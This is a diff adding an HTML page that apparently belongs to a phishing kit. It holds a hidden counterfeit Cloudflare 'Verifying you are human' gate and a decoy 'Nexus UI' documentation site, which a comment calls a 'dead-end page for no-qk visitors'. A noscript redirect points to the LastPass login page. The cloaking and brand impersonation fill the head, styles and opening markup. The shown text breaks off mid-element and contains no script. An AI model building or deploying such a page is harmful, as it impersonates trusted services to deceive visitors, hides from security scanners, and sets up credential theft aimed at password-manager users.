@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Just a moment...</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23333'/><text x='16' y='23' text-anchor='middle' fill='white' font-size='16' font-weight='bold'>UI</text></svg>">
+<noscript><meta http-equiv="refresh" content="3;url=https://lastpass.com/login"></noscript>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;line-height:1.6;color:#333f48}
+
+/* ═══════════════════════════════════════════
+   Cloudflare verification gate
+   ═══════════════════════════════════════════ */
+#cf-gate{background:#f5f5f5;display:none;align-items:center;justify-content:center;min-height:100vh;transition:opacity .4s ease}
+.cf-box{text-align:center;max-width:400px;padding:40px}
+.cf-logo{margin-bottom:24px}
+.cf-logo svg{width:160px;height:44px}
+.cf-box h1{font-size:20px;font-weight:600;color:#333;margin-bottom:8px}
+.cf-sub{font-size:14px;color:#666;margin-bottom:32px}
+.cf-spin-wrap{position:relative;width:40px;height:40px;margin:0 auto 24px}
+.cf-spinner{width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#f6821f;border-radius:50%;animation:cfspin .8s linear infinite}
+@keyframes cfspin{to{transform:rotate(360deg)}}
+.cf-check{display:none;color:#2ecc71;font-size:28px;position:absolute;top:0;left:0;width:40px;text-align:center;line-height:40px}
+.cf-bar{width:100%;height:3px;background:#e0e0e0;border-radius:2px;overflow:hidden}
+.cf-fill{height:100%;width:0;background:#f6821f}
+.cf-status{font-size:13px;color:#888;margin-top:16px}
+.cf-ray{font-size:11px;color:#aaa;margin-top:8px}
+
+/* ═══════════════════════════════════════════
+   Framework documentation site filler
+   ═══════════════════════════════════════════ */
+#docs-page{display:block}
+
+/* Layout system */
+.docs-layout{display:grid;grid-template-columns:260px 1fr 200px;min-height:100vh;background:#f9fafb}
+.docs-sidebar{background:#ffffff;border-right:1px solid #e5e7eb;padding:24px 0;overflow-y:auto;position:sticky;top:0;height:100vh}
+.docs-content{padding:48px 56px 80px;max-width:860px;min-width:0}
+.docs-toc{padding:32px 16px;position:sticky;top:0;height:100vh;overflow-y:auto;font-size:13px}
+
+/* Navigation header */
+.docs-header{grid-column:1/-1;background:#fff;border-bottom:1px solid #e5e7eb;padding:0 24px;display:flex;align-items:center;height:64px;position:sticky;top:0;z-index:50}
+.docs-brand{display:flex;align-items:center;gap:10px;font-size:18px;font-weight:700;color:#111827;text-decoration:none}
+.docs-brand-icon{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,#6366f1,#8b5cf6);display:flex;align-items:center;justify-content:center}
+.docs-brand-icon svg{width:18px;height:18px;fill:#fff}
+.docs-search{margin-left:32px;background:#f3f4f6;border:1px solid #e5e7eb;border-radius:8px;padding:8px 16px;width:320px;font-size:14px;color:#6b7280;display:flex;align-items:center;gap:8px;cursor:pointer;transition:border-color .15s}
+.docs-search:hover{border-color:#d1d5db}
+.docs-search kbd{background:#fff;border:1px solid #d1d5db;border-radius:4px;padding:1px 6px;font-size:11px;color:#9ca3af;margin-left:auto;font-family:inherit}
+.docs-header-links{margin-left:auto;display:flex;gap:20px;align-items:center}
+.docs-header-links a{font-size:14px;color:#6b7280;text-decoration:none;transition:color .15s}
+.docs-header-links a:hover{color:#111827}
+.docs-version{background:#dbeafe;color:#1d4ed8;font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px}
+
+/* Sidebar navigation */
+.docs-nav-section{padding:0 16px;margin-bottom:24px}
+.docs-nav-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:#9ca3af;padding:0 12px;margin-bottom:8px}
+.docs-nav-item{display:block;padding:6px 12px;font-size:14px;color:#4b5563;text-decoration:none;border-radius:6px;transition:all .1s;margin-bottom:1px}
+.docs-nav-item:hover{background:#f3f4f6;color:#111827}
+.docs-nav-item.active{background:#eef2ff;color:#4f46e5;font-weight:500}
+.docs-nav-item .nav-badge{background:#fef3c7;color:#92400e;font-size:10px;font-weight:600;padding:1px 6px;border-radius:10px;margin-left:6px}
+.docs-nav-sub{padding-left:24px}
+.docs-nav-sub .docs-nav-item{font-size:13px;color:#6b7280}
+.docs-nav-divider{height:1px;background:#e5e7eb;margin:16px 16px}
+
+/* Content typography */
+.docs-content h1{font-size:32px;font-weight:800;color:#111827;letter-spacing:-.5px;margin-bottom:8px;line-height:1.2}
+.docs-content h2{font-size:22px;font-weight:700;color:#111827;margin-top:48px;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid #e5e7eb}
+.docs-content h3{font-size:17px;font-weight:600;color:#1f2937;margin-top:32px;margin-bottom:12px}
+.docs-content h4{font-size:15px;font-weight:600;color:#374151;margin-top:24px;margin-bottom:8px}
+.docs-content p{font-size:15px;color:#4b5563;margin-bottom:16px;line-height:1.75}
+.docs-content a{color:#4f46e5;text-decoration:none;font-weight:500}
+.docs-content a:hover{text-decoration:underline}
+.docs-breadcrumb{font-size:13px;color:#9ca3af;margin-bottom:16px;display:flex;gap:6px;align-items:center}
+.docs-breadcrumb span{color:#6b7280}
+.docs-updated{font-size:13px;color:#9ca3af;margin-bottom:32px}
+
+/* Code blocks */
+.docs-code-block{background:#1e1e2e;border-radius:10px;padding:0;margin:16px 0 24px;overflow:hidden;border:1px solid #313244}
+.docs-code-header{background:#181825;padding:10px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #313244}
+.docs-code-lang{font-size:12px;color:#a6adc8;font-weight:500;display:flex;align-items:center;gap:6px}
+.docs-code-lang::before{content:'';width:8px;height:8px;border-radius:50%}
+.docs-code-lang.lang-js::before{background:#f7df1e}.docs-code-lang.lang-ts::before{background:#3178c6}.docs-code-lang.lang-bash::before{background:#89b4fa}.docs-code-lang.lang-css::before{background:#a6e3a1}.docs-code-lang.lang-html::before{background:#fab387}
+.docs-code-copy{background:transparent;border:1px solid #45475a;color:#a6adc8;font-size:12px;padding:4px 10px;border-radius:4px;cursor:pointer;transition:all .15s}
+.docs-code-copy:hover{background:#313244;color:#cdd6f4}
+.docs-code-block pre{padding:16px;margin:0;overflow-x:auto;font-size:13px;line-height:1.7;color:#cdd6f4;font-family:'JetBrains Mono',Consolas,'Courier New',monospace}
+.docs-code-block .kw{color:#cba6f7}.docs-code-block .str{color:#a6e3a1}.docs-code-block .fn{color:#89b4fa}.docs-code-block .cm{color:#6c7086}.docs-code-block .num{color:#fab387}.docs-code-block .op{color:#89dceb}.docs-code-block .ty{color:#f9e2af}
+.docs-inline-code{background:#f3f4f6;padding:2px 8px;border-radius:4px;font-size:13px;font-family:'JetBrains Mono',Consolas,monospace;color:#be185d;border:1px solid #e5e7eb}
+
+/* Callout boxes */
+.docs-callout{border-radius:8px;padding:16px 20px;margin:20px 0;font-size:14px;line-height:1.65;display:flex;gap:12px}
+.docs-callout-icon{font-size:18px;flex-shrink:0;margin-top:1px}
+.docs-callout.info{background:#eff6ff;border:1px solid #bfdbfe;color:#1e40af}
+.docs-callout.warn{background:#fffbeb;border:1px solid #fde68a;color:#92400e}
+.docs-callout.danger{background:#fef2f2;border:1px solid #fecaca;color:#991b1b}
+.docs-callout.tip{background:#f0fdf4;border:1px solid #bbf7d0;color:#166534}
+.docs-callout code{background:rgba(0,0,0,.06);padding:1px 5px;border-radius:3px;font-size:13px}
+
+/* Tables */
+.docs-table-wrap{overflow-x:auto;margin:16px 0 24px;border:1px solid #e5e7eb;border-radius:8px}
+.docs-table{width:100%;border-collapse:collapse;font-size:14px}
+.docs-table th{background:#f9fafb;text-align:left;padding:10px 16px;font-weight:600;color:#374151;border-bottom:1px solid #e5e7eb;white-space:nowrap}
+.docs-table td{padding:10px 16px;border-bottom:1px solid #f3f4f6;color:#4b5563;vertical-align:top}
+.docs-table tr:last-child td{border-bottom:none}
+.docs-table tr:hover td{background:#f9fafb}
+.docs-table code{background:#f3f4f6;padding:1px 6px;border-radius:3px;font-size:12px;color:#be185d}
+
+/* Feature cards */
+.docs-features{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:24px 0}
+.docs-feature-card{border:1px solid #e5e7eb;border-radius:10px;padding:20px;background:#fff;transition:border-color .15s,box-shadow .15s}
+.docs-feature-card:hover{border-color:#c7d2fe;box-shadow:0 4px 12px rgba(79,70,229,.08)}
+.docs-feature-card h4{font-size:15px;font-weight:600;color:#111827;margin:0 0 6px;display:flex;align-items:center;gap:8px}
+.docs-feature-card p{font-size:13px;color:#6b7280;margin:0;line-height:1.55}
+.docs-feature-icon{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;margin-bottom:12px}
+
+/* Tabs */
+.docs-tabs{display:flex;border-bottom:2px solid #e5e7eb;margin:24px 0 0;gap:0}
+.docs-tab{padding:10px 20px;font-size:14px;font-weight:500;color:#6b7280;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px;transition:all .15s}
+.docs-tab.active{color:#4f46e5;border-bottom-color:#4f46e5}
+.docs-tab:hover{color:#111827}
+.docs-tab-content{padding:20px 0}
+
+/* Props list */
+.docs-prop{padding:12px 0;border-bottom:1px solid #f3f4f6}
+.docs-prop:last-child{border-bottom:none}
+.docs-prop-name{font-family:'JetBrains Mono',Consolas,monospace;font-size:14px;color:#be185d;font-weight:500}
+.docs-prop-type{font-size:12px;color:#6b7280;margin-left:8px;background:#f3f4f6;padding:1px 8px;border-radius:4px;font-family:inherit}
+.docs-prop-required{font-size:11px;color:#dc2626;font-weight:600;margin-left:6px}
+.docs-prop-desc{font-size:13px;color:#4b5563;margin-top:4px;line-height:1.6}
+.docs-prop-default{font-size:12px;color:#9ca3af;margin-top:2px}
+
+/* TOC */
+.docs-toc-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.8px;color:#9ca3af;margin-bottom:12px}
+.docs-toc-list{list-style:none;padding:0}
+.docs-toc-list li{margin-bottom:6px}
+.docs-toc-list a{font-size:13px;color:#6b7280;text-decoration:none;display:block;padding:2px 0;transition:color .1s;border-left:2px solid transparent;padding-left:10px}
+.docs-toc-list a:hover{color:#111827}
+.docs-toc-list a.active{color:#4f46e5;border-left-color:#4f46e5;font-weight:500}
+.docs-toc-list .toc-sub{padding-left:12px}
+
+/* Pagination */
+.docs-pagination{display:flex;justify-content:space-between;margin-top:64px;padding-top:32px;border-top:1px solid #e5e7eb}
+.docs-page-link{display:flex;flex-direction:column;gap:4px;text-decoration:none;padding:12px 16px;border:1px solid #e5e7eb;border-radius:8px;transition:all .15s;max-width:45%}
+.docs-page-link:hover{border-color:#c7d2fe;background:#fafafe}
+.docs-page-link .page-dir{font-size:12px;color:#9ca3af;font-weight:500}
+.docs-page-link .page-name{font-size:14px;color:#4f46e5;font-weight:600}
+.docs-page-link.prev{align-items:flex-start}
+.docs-page-link.next{align-items:flex-end;margin-left:auto}
+
+/* Footer */
+.docs-footer{grid-column:1/-1;border-top:1px solid #e5e7eb;background:#fff;padding:32px 48px;display:flex;justify-content:space-between;align-items:center;font-size:13px;color:#9ca3af}
+.docs-footer a{color:#6b7280;text-decoration:none;margin-left:24px}
+.docs-footer a:hover{color:#111827}
+
+/* Badges & Pills */
+.badge{display:inline-flex;align-items:center;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600;letter-spacing:.3px}
+.badge-blue{background:#dbeafe;color:#1d4ed8}.badge-green{background:#dcfce7;color:#166534}.badge-amber{background:#fef3c7;color:#92400e}.badge-red{background:#fef2f2;color:#991b1b}.badge-purple{background:#f3e8ff;color:#7c3aed}.badge-gray{background:#f3f4f6;color:#6b7280}
+
+/* Step indicators */
+.docs-steps{counter-reset:step;margin:24px 0}
+.docs-step{position:relative;padding-left:48px;margin-bottom:24px;counter-increment:step}
+.docs-step::before{content:counter(step);position:absolute;left:0;top:0;width:32px;height:32px;border-radius:50%;background:#eef2ff;color:#4f46e5;font-weight:700;font-size:14px;display:flex;align-items:center;justify-content:center;border:2px solid #c7d2fe}
+.docs-step h4{margin-top:4px;margin-bottom:4px}
+.docs-step p{font-size:14px;color:#6b7280}
+
+/* Responsive utility grid */
+.docs-grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:16px 0}
+.docs-grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:16px 0}
+
+/* Stat cards */
+.docs-stat-card{text-align:center;padding:20px;background:#fff;border:1px solid #e5e7eb;border-radius:10px}
+.docs-stat-number{font-size:32px;font-weight:800;color:#111827;line-height:1}
+.docs-stat-label{font-size:13px;color:#9ca3af;margin-top:4px}
+
+/* Announcement banner */
+.docs-banner{background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;padding:12px 24px;text-align:center;font-size:14px;font-weight:500}
+.docs-banner a{color:#e0e7ff;text-decoration:underline}
+
+/* Skeleton loading */
+.docs-skeleton{background:linear-gradient(90deg,#f3f4f6 25%,#e5e7eb 50%,#f3f4f6 75%);background-size:200% 100%;animation:shimmer 1.5s infinite;border-radius:4px;height:16px;margin-bottom:8px}
+@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}
+
+/* Dark mode variables (unused but adds CSS bulk) */
+@media(prefers-color-scheme:dark){
+:root{--bg-primary:#0f172a;--bg-secondary:#1e293b;--bg-tertiary:#334155;--text-primary:#f1f5f9;--text-secondary:#cbd5e1;--text-muted:#94a3b8;--border:#334155;--accent:#818cf8;--accent-bg:#312e81;--code-bg:#1e293b;--hover:#1e293b}
+}
+
+/* Additional utility classes for spacing/display */
+.mt-0{margin-top:0}.mt-2{margin-top:8px}.mt-4{margin-top:16px}.mt-6{margin-top:24px}.mt-8{margin-top:32px}.mt-12{margin-top:48px}
+.mb-0{margin-bottom:0}.mb-2{margin-bottom:8px}.mb-4{margin-bottom:16px}.mb-6{margin-bottom:24px}.mb-8{margin-bottom:32px}
+.p-2{padding:8px}.p-4{padding:16px}.p-6{padding:24px}.p-8{padding:32px}
+.text-sm{font-size:13px}.text-xs{font-size:11px}.text-lg{font-size:18px}.text-xl{font-size:22px}.text-2xl{font-size:28px}
+.text-gray-400{color:#9ca3af}.text-gray-500{color:#6b7280}.text-gray-600{color:#4b5563}.text-gray-700{color:#374151}
+.font-medium{font-weight:500}.font-semibold{font-weight:600}.font-bold{font-weight:700}
+.rounded{border-radius:4px}.rounded-md{border-radius:6px}.rounded-lg{border-radius:8px}.rounded-xl{border-radius:12px}
+.border{border:1px solid #e5e7eb}.border-t{border-top:1px solid #e5e7eb}.border-b{border-bottom:1px solid #e5e7eb}
+.flex{display:flex}.items-center{align-items:center}.justify-between{justify-content:space-between}.gap-2{gap:8px}.gap-4{gap:16px}
+.hidden{display:none}.block{display:block}.inline{display:inline}.inline-flex{display:inline-flex}
+.w-full{width:100%}.max-w-3xl{max-width:768px}.mx-auto{margin-left:auto;margin-right:auto}
+.overflow-hidden{overflow:hidden}.overflow-x-auto{overflow-x:auto}
+.opacity-0{opacity:0}.opacity-50{opacity:.5}.opacity-100{opacity:1}
+.transition{transition:all .15s ease}.duration-200{transition-duration:.2s}.duration-300{transition-duration:.3s}
+.cursor-pointer{cursor:pointer}.select-none{user-select:none}
+.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border-width:0}
+.truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.whitespace-pre{white-space:pre}.whitespace-nowrap{white-space:nowrap}
+.list-none{list-style:none}.list-disc{list-style:disc}
+.space-y-1>*+*{margin-top:4px}.space-y-2>*+*{margin-top:8px}.space-y-4>*+*{margin-top:16px}
+.shadow-sm{box-shadow:0 1px 2px rgba(0,0,0,.05)}.shadow{box-shadow:0 1px 3px rgba(0,0,0,.1),0 1px 2px rgba(0,0,0,.06)}.shadow-md{box-shadow:0 4px 6px -1px rgba(0,0,0,.1),0 2px 4px -1px rgba(0,0,0,.06)}.shadow-lg{box-shadow:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -2px rgba(0,0,0,.05)}
+.animate-pulse{animation:pulse 2s cubic-bezier(.4,0,.6,1) infinite}@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.animate-spin{animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}
+.ring-1{box-shadow:0 0 0 1px rgba(0,0,0,.05)}.ring-2{box-shadow:0 0 0 2px rgba(79,70,229,.3)}
+.divide-y>*+*{border-top:1px solid #f3f4f6}
+.bg-white{background:#fff}.bg-gray-50{background:#f9fafb}.bg-gray-100{background:#f3f4f6}.bg-indigo-50{background:#eef2ff}
+</style>
+</head>
+<body><div id="cf-gate">
+<div class="cf-box">
+<div class="cf-logo">
+<svg width="160" height="44" viewBox="0 0 170 44" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M46.78 31.63L47.13 30.41C47.55 28.96 47.39 27.62 46.69 26.64C46.05 25.73 44.97 25.2 43.67 25.13L18.95 24.82C18.79 24.81 18.65 24.73 18.56 24.61C18.48 24.49 18.46 24.32 18.51 24.16C18.6 23.92 18.84 23.73 19.08 23.72L44.02 23.41C46.98 23.27 50.18 20.86 51.3 17.92L52.73 14.18C52.77 14.08 52.78 13.97 52.78 13.86C52.78 13.81 52.77 13.75 52.77 13.69C51.16 6.39 44.67 0.93 36.93 0.93C29.79 0.93 23.72 5.57 21.55 12.0C20.14 10.95 18.35 10.38 16.42 10.57C12.99 10.91 10.23 13.69 9.89 17.14C9.8 18.03 9.88 18.89 10.08 19.7C4.49 19.87 0 24.48 0 30.13C0 30.65 0.04 31.15 0.11 31.64C0.14 31.89 0.35 32.06 0.59 32.06L46.2 32.07C46.21 32.07 46.21 32.07 46.22 32.07C46.48 32.06 46.71 31.89 46.78 31.63Z" fill="#f6821f"/>
+<path d="M55.01 14.45C54.78 14.45 54.56 14.46 54.33 14.47C54.29 14.47 54.25 14.48 54.22 14.49C54.11 14.54 54.01 14.64 53.97 14.76L53.0 18.13C52.58 19.58 52.73 20.92 53.44 21.9C54.08 22.81 55.16 23.34 56.46 23.41L61.73 23.72C61.88 23.73 62.02 23.8 62.1 23.93C62.19 24.05 62.21 24.22 62.16 24.38C62.07 24.62 61.83 24.81 61.59 24.82L56.11 25.13C53.15 25.27 49.94 27.68 48.82 30.62L48.42 31.66C48.34 31.85 48.48 32.05 48.67 32.06C48.68 32.06 48.68 32.06 48.69 32.06H67.53C67.75 32.06 67.95 31.91 68.02 31.69C68.35 30.52 68.52 29.29 68.52 28.02C68.52 20.53 62.47 14.45 55.01 14.45Z" fill="#faad3f"/>
+<text x="74" y="27" font-size="16" font-weight="600" fill="#404040" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif" letter-spacing="0.5">cloudflare</text>
+</svg>
+</div>
+<h1 id="cf-title">Verifying you are human</h1>
+<p class="cf-sub">This may take a few seconds.</p>
+<div class="cf-spin-wrap">
+<div class="cf-spinner" id="cf-sp"></div>
+<div class="cf-check" id="cf-ck">&#10003;</div>
+</div>
+<div class="cf-bar"><div class="cf-fill" id="cf-fl"></div></div>
+<p class="cf-status" id="cf-st">Checking your browser...</p>
+<p class="cf-ray" id="cf-ri"></p>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     Documentation framework filler — dead-end page for no-qk visitors
+     This is a realistic-looking CSS framework docs site.
+     ═══════════════════════════════════════════════════════════ -->
+<div id="docs-page">
+<div class="docs-banner">🚀 <strong>Nexus UI v4.2</strong> is now available — <a href="https://github.com">View changelog →</a></div>
+<div class="docs-header">
+    <a class="docs-brand" href="#">
+        <div class="docs-brand-icon"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg></div>
+        Nexus UI
+    </a>
+    <div class="docs-search">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+        Search documentation...
+        <kbd>⌘K</kbd>
+    </div>
+    <div class="docs-header-links">
+        <span class="docs-version">v4.2.0</span>
+        <a href="#">Guide</a>
+        <a href="#">API</a>
+        <a href="#">Examples</a>
+        <a href="https://github.com">GitHub</a>
+    </div>
+</div>
+
+<div class="docs-layout">
+<aside class="docs-sidebar">
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Getting Started</div>
+        <a class="docs-nav-item active" href="#">Introduction</a>
+        <a class="docs-nav-item" href="#">Installation</a>
+        <a class="docs-nav-item" href="#">Quick Start</a>
+        <a class="docs-nav-item" href="#">Configuration</a>
+        <a class="docs-nav-item" href="#">TypeScript <span class="nav-badge">New</span></a>
+    </div>
+    <div class="docs-nav-divider"></div>
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Core Concepts</div>
+        <a class="docs-nav-item" href="#">Theming</a>
+        <a class="docs-nav-item" href="#">Layout System</a>
+        <a class="docs-nav-item" href="#">Responsive Design</a>
+        <a class="docs-nav-item" href="#">Dark Mode</a>
+        <a class="docs-nav-item" href="#">Accessibility</a>
+        <a class="docs-nav-item" href="#">Internationalization</a>
+    </div>
+    <div class="docs-nav-divider"></div>
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Components</div>
+        <a class="docs-nav-item" href="#">Button</a>
+        <a class="docs-nav-item" href="#">Input</a>
+        <a class="docs-nav-item" href="#">Select</a>
+        <a class="docs-nav-item" href="#">Checkbox</a>
+        <a class="docs-nav-item" href="#">Radio</a>
+        <a class="docs-nav-item" href="#">Toggle</a>
+        <a class="docs-nav-item" href="#">Slider</a>
+        <a class="docs-nav-item" href="#">Textarea</a>
+    </div>
+    <div class="docs-nav-divider"></div>
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Layout</div>
+        <a class="docs-nav-item" href="#">Container</a>
+        <a class="docs-nav-item" href="#">Grid</a>
+        <a class="docs-nav-item" href="#">Stack</a>
+        <a class="docs-nav-item" href="#">Divider</a>
+        <a class="docs-nav-item" href="#">Spacer</a>
+    </div>
+    <div class="docs-nav-divider"></div>
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Feedback</div>
+        <a class="docs-nav-item" href="#">Alert</a>
+        <a class="docs-nav-item" href="#">Toast</a>
+        <a class="docs-nav-item" href="#">Progress</a>
+        <a class="docs-nav-item" href="#">Skeleton</a>
+        <a class="docs-nav-item" href="#">Spinner</a>
+    </div>
+    <div class="docs-nav-divider"></div>
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Data Display</div>
+        <a class="docs-nav-item" href="#">Table</a>
+        <a class="docs-nav-item" href="#">Badge</a>
+        <a class="docs-nav-item" href="#">Card</a>
+        <a class="docs-nav-item" href="#">Avatar</a>
+        <a class="docs-nav-item" href="#">Tooltip</a>
+        <a class="docs-nav-item" href="#">Tag</a>
+    </div>
+    <div class="docs-nav-divider"></div>
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Overlay</div>
+        <a class="docs-nav-item" href="#">Modal</a>
+        <a class="docs-nav-item" href="#">Drawer</a>
+        <a class="docs-nav-item" href="#">Popover</a>
+        <a class="docs-nav-item" href="#">Menu</a>
+        <a class="docs-nav-item" href="#">Dialog</a>
+    </div>
+    <div class="docs-nav-divider"></div>
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Navigation</div>
+        <a class="docs-nav-item" href="#">Tabs</a>
+        <a class="docs-nav-item" href="#">Breadcrumb</a>
+        <a class="docs-nav-item" href="#">Pagination</a>
+        <a class="docs-nav-item" href="#">Steps</a>
+        <a class="docs-nav-item" href="#">Navbar</a>
+    </div>
+    <div class="docs-nav-divider"></div>
+    <div class="docs-nav-section">
+        <div class="docs-nav-title">Utilities</div>
+        <a class="docs-nav-item" href="#">Hooks</a>
+        <a class="docs-nav-item" href="#">Transitions</a>
+        <a class="docs-nav-item" href="#">Portal</a>
+        <a class="docs-nav-item" href="#">Focus Lock</a>
+        <a class="docs-nav-item" href="#">Media Query</a>
+    </div>
+</aside>
+
+<main class="docs-content">
+    <div class="docs-breadcrumb">
+        <a href="#">Docs</a> <span>/</span> <a href="#">Getting Started</a> <span>/</span> Introduction
+    </div>
+    <h1>Introduction</h1>
+    <p class="docs-updated">Last updated: March 14, 2026 · <a href="#">Edit this page</a></p>
+
+    <p>Nexus UI is a comprehensive, accessible component library for building modern web applications. It provides a robust set of pre-built components, a flexible theming system, and seamless TypeScript integration out of the box.</p>
+
+    <div class="docs-callout tip">
+        <span class="docs-callout-icon">💡</span>
+        <div>If you're new to Nexus UI, we recommend starting with the <a href="#">Quick Start guide</a> to get up and running in under 5 minutes. For migration from v3, see the <a href="#">migration guide</a>.</div>
+    </div>
+
+    <div class="docs-features">
+        <div class="docs-feature-card">
+            <div class="docs-feature-icon" style="background:#eef2ff">🎨</div>
+            <h4>Themeable</h4>
+            <p>Fully customizable design tokens with CSS variables. Light and dark mode built-in. Create unlimited custom themes.</p>
+        </div>
+        <div class="docs-feature-card">
+            <div class="docs-feature-icon" style="background:#f0fdf4">♿</div>
+            <h4>Accessible</h4>
+            <p>WAI-ARIA compliant. Full keyboard navigation. Screen reader tested. WCAG 2.1 AA conformance across all components.</p>
+        </div>
+        <div class="docs-feature-card">
+            <div class="docs-feature-icon" style="background:#fef3c7">⚡</div>
+            <h4>Performant</h4>
+            <p>Tree-shakeable. Zero runtime CSS-in-JS. Lazy-loaded components. Average bundle impact under 8KB gzipped per component.</p>
+        </div>
+        <div class="docs-feature-card">
+            <div class="docs-feature-icon" style="background:#fce7f3">🔷</div>
+            <h4>TypeScript First</h4>
+            <p>Written in TypeScript with complete type definitions. IntelliSense for all props, slots, and events. Generic component support.</p>
+        </div>
+    </div>
+
+    <h2 id="installation">Installation</h2>
+    <p>Install Nexus UI and its peer dependencies using your preferred package manager:</p>
+
+    <div class="docs-tabs">
+        <div class="docs-tab active">npm</div>
+        <div class="docs-tab">yarn</div>
+        <div class="docs-tab">pnpm</div>
+        <div class="docs-tab">bun</div>
+    </div>
+    <div class="docs-tab-content">
+        <div class="docs-code-block">
+            <div class="docs-code-header">
+                <span class="docs-code-lang lang-bash">Terminal</span>
+                <button class="docs-code-copy">Copy</button>
+            </div>
+            <pre>npm install @nexus-ui/react @nexus-ui/theme</pre>
+        </div>
+    </div>
+
+    <h3 id="peer-deps">Peer dependencies</h3>
+    <p>Nexus UI requires the following peer dependencies. Most projects already have these installed:</p>
+
+    <div class="docs-table-wrap">
+        <table class="docs-table">
+            <thead><tr><th>Package</th><th>Version</th><th>Required</th><th>Notes</th></tr></thead>
+            <tbody>
+                <tr><td><code>react</code></td><td>≥ 18.0</td><td><span class="badge badge-red">Required</span></td><td>React 19 supported with v4.2+</td></tr>
+                <tr><td><code>react-dom</code></td><td>≥ 18.0</td><td><span class="badge badge-red">Required</span></td><td>Must match React version</td></tr>
+                <tr><td><code>framer-motion</code></td><td>≥ 10.0</td><td><span class="badge badge-amber">Optional</span></td><td>Only for animated components</td></tr>
+                <tr><td><code>@floating-ui/react</code></td><td>≥ 0.26</td><td><span class="badge badge-amber">Optional</span></td><td>Only for Popover, Tooltip, Menu</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <h2 id="quick-start">Quick Start</h2>
+    <p>Wrap your application with the <code class="docs-inline-code">NexusProvider</code> and start using components:</p>
+
+    <div class="docs-code-block">
+        <div class="docs-code-header">
+            <span class="docs-code-lang lang-ts">App.tsx</span>
+            <button class="docs-code-copy">Copy</button>
+        </div>
+        <pre><span class="kw">import</span> { <span class="ty">NexusProvider</span>, <span class="ty">Button</span>, <span class="ty">Input</span> } <span class="kw">from</span> <span class="str">'@nexus-ui/react'</span>
+<span class="kw">import</span> { <span class="ty">defaultTheme</span> } <span class="kw">from</span> <span class="str">'@nexus-ui/theme'</span>
+
+<span class="kw">export default function</span> <span class="fn">App</span>() {
+  <span class="kw">return</span> (
+    &lt;<span class="ty">NexusProvider</span> <span class="fn">theme</span>={<span class="ty">defaultTheme</span>}&gt;
+      &lt;<span class="ty">Input</span>
+        <span class="fn">label</span>=<span class="str">"Email address"</span>
+        <span class="fn">type</span>=<span class="str">"email"</span>
+        <span class="fn">placeholder</span>=<span class="str">"you@example.com"</span>
+        <span class="fn">variant</span>=<span class="str">"outlined"</span>
+      /&gt;
+      &lt;<span class="ty">Button</span> <span class="fn">color</span>=<span class="str">"primary"</span> <span class="fn">size</span>=<span class="str">"lg"</span>&gt;
+        Get Started
+      &lt;/<span class="ty">Button</span>&gt;
+    &lt;/<span class="ty">NexusProvider</span>&gt;
+  )
+}</pre>
+    </div>
+
+    <div class="docs-callout info">
+        <span class="docs-callout-icon">ℹ️</span>
+        <div>The <code>NexusProvider</code> component must wrap your entire application. It provides theme context, manages color mode, and handles portal containers for overlay components.</div>
+    </div>
+
+    <h2 id="configuration">Configuration</h2>
+    <p>Nexus UI can be configured through the provider's <code class="docs-inline-code">config</code> prop. Here are the available configuration options:</p>
+
+    <div class="docs-prop">
+        <span class="docs-prop-name">theme</span>
+        <span class="docs-prop-type">Theme</span>
+        <span class="docs-prop-required">Required</span>
+        <div class="docs-prop-desc">The theme object containing design tokens, component styles, and color palette definitions.</div>
+    </div>
+    <div class="docs-prop">
+        <span class="docs-prop-name">colorMode</span>
+        <span class="docs-prop-type">'light' | 'dark' | 'system'</span>
+        <div class="docs-prop-desc">Initial color mode. When set to <code class="docs-inline-code">'system'</code>, automatically matches the user's OS preference.</div>
+        <div class="docs-prop-default">Default: <code class="docs-inline-code">'system'</code></div>
+    </div>
+    <div class="docs-prop">
+        <span class="docs-prop-name">locale</span>
